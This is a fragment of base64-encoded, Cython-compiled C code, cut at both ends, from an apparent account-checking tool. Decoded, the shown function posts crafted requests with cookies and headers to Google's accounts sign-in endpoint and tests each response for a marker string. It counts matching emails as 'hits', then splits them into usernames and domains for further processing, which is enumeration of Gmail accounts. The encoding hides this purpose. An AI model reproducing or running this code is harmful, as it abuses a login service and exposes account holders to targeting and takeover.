ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICB9CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF8xMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UTCwgX19weXhfdl90bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X3BhcmFtcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGludWVfaHR0cHNfM0FfMkZfMkZtYWlsX2dvb2csIF9fcHl4X3ZfdGwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkNfMjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfMTAsIF9fcHl4X3ZfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF92X2RhdGEgPSBfX3B5eF90XzEwOwogICAgICBfX3B5eF90XzEwID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CgogICAgICAKICAgICAgX19weXhfdF8xMyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTQpKSkgewogICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpOwogICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNCk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE0LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDQgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduXzJ9OwogICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF92X3BhcmFtcywgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9jb29raWVzLCBfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzE0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8IChfX3B5eF90XzEzKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICB9CiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzEwOwogICAgICBfX3B5eF90XzEwID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzI0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlVbmljb2RlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nZl91YXJfMSwgX19weXhfdF8xNCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAzMjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICBpZiAoX19weXhfdF80KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzI1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMyNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaXRzLCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMyNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF8xNCA9IE5VTEw7CiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcHBwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBfX3B5eF90XzEzID0gMTsKICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7CiAgICAgICAgICBfX3B5eF90XzE0ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgICAgIGFzc2VydChfX3B5eF90XzE0KTsKICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTQsIE5VTEx9OwogICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMCwgX19weXhfdl9lbWFpbCwgUHlfTkUpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX3B5eF90XzQpIHsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMTAgPSBQeU51bWJlcl9BZGQoX19weXhfdl9lbWFpbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzI4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIF9fcHl4X3Zfb2sgPSBfX3B5eF90XzEwOwogICAgICAgICAgX19weXhfdF8xMCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF92X29rOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTB9OwogICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfMTA7CiAgICAgICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXF1ZW5jZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7CiAgICAgICAgICAgICAgaWYgKHNpemUgPiAyKSBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcigyKTsKICAgICAgICAgICAgICBlbHNlIGlmIChzaXplID49IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihzaXplKTsKICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgfQogICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkgewogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDApOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDApOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAjZWxzZQogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xOwogICAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgX19weXhfdF8xNyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfNik7CiAgICAgICAgICAgIGluZGV4ID0gMDsgX19weXhfdF81ID0gX19weXhfdF8xNyhfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIGdvdG8gX19weXhfTDIyX3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfMTQgPSBfX3B5eF90XzE3KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIGdvdG8gX19weXhfTDIyX3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzYpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgZ290byBfX3B5eF9MMjNfdW5wYWNraW5nX2RvbmU7CiAgICAgICAgICAgIF9fcHl4X0wyMl91bnBhY2tpbmdfZmFpbGVkOjsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMOwogICAgICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7CiAgICAgICAgICAgIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX3B5eF9MMjNfdW5wYWNraW5nX2RvbmU6OwogICAgICAgICAgfQogICAgICAgICAgX19weXhfdl91c2VybmFtZSA9IF9fcHl4X3RfNTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX3B5eF92X2dnID0gX19weXhfdF8xNDsKICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xNCA9IE5VTEw7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMTsKICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICAgICAgICBfX3B5eF90XzE0ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTQpOwogICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIH0KICAgICAgICAgICNlbmRpZgogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZ307CiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgzLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMzMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBnb3RvIF9fcHl4X0wyMTsKICAgICAgICB9CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF92X2VtYWlsOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTB9OwogICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xMCkpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfMTA7CiAgICAgICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXF1ZW5jZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplICE9I